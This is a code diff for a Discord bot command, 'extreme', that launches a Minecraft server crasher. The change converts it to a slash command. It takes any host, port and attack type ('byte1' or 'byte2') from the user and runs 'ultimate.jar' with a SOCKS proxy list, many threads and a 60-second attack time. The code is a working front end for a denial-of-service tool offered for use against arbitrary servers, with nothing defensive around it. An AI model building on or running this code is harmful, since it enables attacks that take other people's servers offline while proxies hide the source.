@@ -5,26 +5,43 @@ const threads = require('../jsons/threads.json');
 
 module.exports = new Command({
     name: "extreme",
-    description: "Эксплоит extreme",
+    description: "Exploit Extreme",
     permissions: "SEND_MESSAGES",
-    async execute(client, args, message){
-        const iphost = args[1].split(":").slice(0,1);
-        const port = args[1].split(":") [1] || 25565;
-        const typee = args[2];
-        var type = "";
-        
-        if(!typee) return errorembed("Выберете один из подметодов (Доступные: 'byte1', 'byte2')");
-        if(typee == "byte1".toLowerCase()) type = "byte1"
-        else if(typee == "byte2".toLowerCase()) type = "byte2"
-        else return;
+    slashCommandOptions: [{
+        name: "host",
+        type: "STRING",
+        description: "Enter host or ip server",
+        required: true
+    }, {
+        name: "type",
+        description: "Type attack",
+        type: 'STRING',
+        choices: [{
+            name: 'byte1',
+            value: 'byte1'
+        }, {
+            name: 'byte2',
+            value: 'byte2'
+        }], 
+        required: true
+    }, {
+        name: "port",
+        description: "Enter port server",
+        type: "NUMBER",
+        required: false
+    }],
+    async execute(client, args, interaction, crashers){
+        const host = args.getString("host");
+        const port = args.getNumber("port") || 25565;
+        const type = args.getString("type");
 
-        if(!args[3]){ 
-            runjar("ultimate.jar", `host=${iphost} port=${port} proxiesFile=proxies/socks_proxies.txt threads=${threads.extreme} attackTime=60 exploit=${type}`, true);
-            runcrash(`Extreme 💥`, iphost, port, true);
-        }
-        if(args[3] == "manualstop"){
-             runjar("ultimate.jar", `host=${iphost} port=${port} proxiesFile=proxies/socks_proxies.txt threads=${threads.extreme} attackTime=60 exploit=${type}`, false);
-             runcrash(`Extreme 💥`, iphost, port, false);
-        }
+        crashers.runcrasher(client, interaction, {
+            jarname: "ultimate.jar",
+            jarargs: `host=${host} port=${port} proxiesFile=proxies/socks_proxies.txt threads=${threads.extreme} attackTime=60 exploit=${type}`
+        }, {
+            method: "Extreme 💥",
+            host: host,
+            port: `${port}`
+        });
     }
 });
